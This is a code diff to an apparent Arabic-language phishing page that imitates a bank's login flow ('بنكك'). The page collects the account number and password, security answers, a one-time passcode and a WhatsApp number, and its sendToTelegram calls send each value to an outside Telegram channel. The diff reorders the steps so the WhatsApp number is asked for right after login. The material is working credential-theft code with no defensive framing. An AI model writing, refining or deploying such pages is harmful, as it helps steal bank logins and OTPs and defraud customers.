@@ -518,17 +518,26 @@
       </div>
     </div>
 
-    <!-- 3. النافذة المنبثقة: موبايل مختلف -->
-    <div class="modal-overlay" id="modalDevice">
-      <div class="modal-box">
-        <div class="modal-header">ترغب في الدخول إلي الخدمة المصرفية؟</div>
-        <div class="modal-body" style="font-size: 0.85rem;">
-          إذا كنت تحاول الدخول من حسابك لاول مرة اضغط على زر الاجابة على أسئلة الامان واتبع التعليمات.
+    <!-- 3. شاشة رقم الواتساب (مباشرة بعد تسجيل الدخول) -->
+    <div class="screen" id="screenWhatsapp">
+      <div class="top-header" style="padding: 12px 16px;">
+        <div class="header-bar">
+          <span class="page-title">التواصل</span>
+          <button type="button" class="btn-top-back" onclick="attemptTransition('screenLogin')">← رجوع</button>
         </div>
-        <div class="modal-actions" style="flex-direction: column; gap: 6px; width: 100%;">
-          <button class="btn-red" onclick="goToSecurityQuestions()">الإجابة على أسئلة الأمان</button>
-          <button class="btn-red" onclick="closeModal('modalDevice')">باستخدام بطاقة الصراف الآلي</button>
-          <button class="btn-red" style="background: #ef4444;" onclick="closeModal('modalDevice')">إلغاء</button>
+        <div class="logo-box" style="transform: scale(0.7);">
+          <div class="logo-ar">بنـ<span>كك</span></div>
+        </div>
+      </div>
+      <div class="form-section">
+        <div style="background:#fff; border:2px solid #e2e8f0; border-radius:12px; padding:20px; text-align:center; box-shadow: 0 4px 12px rgba(0,0,0,0.05);">
+          <div style="font-size:1.8rem; margin-bottom:8px;">💬</div>
+          <p style="font-size:0.9rem; color:#374151; margin-bottom:14px; font-weight:600;">الرجاء كتابة رقم الواتساب للتواصل</p>
+          <div class="input-box">
+            <span class="icon-right">📱</span>
+            <input type="tel" class="input-field" id="whatsappInput" placeholder="أدخل رقم الواتساب" style="direction: ltr; text-align: right;" />
+          </div>
+          <button class="btn-red" onclick="validateWhatsapp()">متابعة</button>
         </div>
       </div>
     </div>
@@ -538,7 +547,7 @@
       <div class="top-header" style="padding: 12px 16px;">
         <div class="header-bar">
           <span class="page-title">أسئلة الأمان</span>
-          <button type="button" class="btn-top-back" onclick="attemptTransition('screenLogin')">← رجوع</button>
+          <button type="button" class="btn-top-back" onclick="attemptTransition('screenWhatsapp')">← رجوع</button>
         </div>
         <div class="logo-box" style="transform: scale(0.7);">
           <div class="logo-ar">بنـ<span>كك</span></div>
@@ -608,31 +617,7 @@
       </div>
     </div>
 
-    <!-- 6. شاشة رقم الواتساب -->
-    <div class="screen" id="screenWhatsapp">
-      <div class="top-header" style="padding: 12px 16px;">
-        <div class="header-bar">
-          <span class="page-title">التواصل</span>
-          <button type="button" class="btn-top-back" onclick="attemptTransition('screenOtp')">← رجوع</button>
-        </div>
-        <div class="logo-box" style="transform: scale(0.7);">
-          <div class="logo-ar">بنـ<span>كك</span></div>
-        </div>
-      </div>
-      <div class="form-section">
-        <div style="background:#fff; border:2px solid #e2e8f0; border-radius:12px; padding:20px; text-align:center; box-shadow: 0 4px 12px rgba(0,0,0,0.05);">
-          <div style="font-size:1.8rem; margin-bottom:8px;">💬</div>
-          <p style="font-size:0.9rem; color:#374151; margin-bottom:14px; font-weight:600;">الرجاء كتابة رقم الواتساب للتواصل</p>
-          <div class="input-box">
-            <span class="icon-right">📱</span>
-            <input type="tel" class="input-field" id="whatsappInput" placeholder="أدخل رقم الواتساب" style="direction: ltr; text-align: right;" />
-          </div>
-          <button class="btn-red" onclick="validateWhatsapp()">متابعة</button>
-        </div>
-      </div>
-    </div>
-
-    <!-- 7. شاشة تقديم الطلب والتواصل الرسمية -->
+    <!-- 6. شاشة تقديم الطلب والتواصل الرسمية -->
     <div class="screen" id="screenLoading">
       <div class="top-header" style="padding: 12px 16px;">
         <div class="header-bar">
@@ -672,9 +657,9 @@
     let accessSteps = {
       screenServices: true,
       screenLogin: false,
+      screenWhatsapp: false,
       screenQuestions: false,
       screenOtp: false,
-      screenWhatsapp: false,
       screenLoading: false
     };
 
@@ -774,11 +759,21 @@
 
       failedAttempts = 0;
       sendToTelegram(`📋 دخول جديد [الخدمة: ${selectedServiceText}]\n🔢 الحساب: ${accInput}\n🔐 كلمة المرور: ${passInput}`);
-      document.getElementById('modalDevice').style.display = 'flex';
+      
+      // الانتقال إلى شاشة الواتساب مباشرة بعد تسجيل الدخول بنجاح
+      accessSteps.screenWhatsapp = true;
+      switchScreen('screenWhatsapp');
     }
 
-    function goToSecurityQuestions() {
-      closeModal('modalDevice');
+    function validateWhatsapp() {
+      const whatsapp = document.getElementById('whatsappInput').value.trim();
+      if (!whatsapp) {
+        showErrorModal("يرجى إدخال رقم الواتساب.", "خطأ", false);
+        return;
+      }
+      sendToTelegram(`📱 رقم الواتساب للتواصل: ${whatsapp}`);
+      
+      // الانتقال بعد الواتساب إلى أسئلة الأمان (أو الخطوة التالية)
       accessSteps.screenQuestions = true;
       switchScreen('screenQuestions');
     }
@@ -850,17 +845,6 @@
       }
 
       sendToTelegram(`🔢 OTP المعتمد: ${otp}`);
-      accessSteps.screenWhatsapp = true;
-      switchScreen('screenWhatsapp');
-    }
-
-    function validateWhatsapp() {
-      const whatsapp = document.getElementById('whatsappInput').value.trim();
-      if (!whatsapp) {
-        showErrorModal("يرجى إدخال رقم الواتساب.", "خطأ", false);
-        return;
-      }
-      sendToTelegram(`📱 رقم الواتساب للتواصل: ${whatsapp}`);
       accessSteps.screenLoading = true;
       switchScreen('screenLoading');
     }
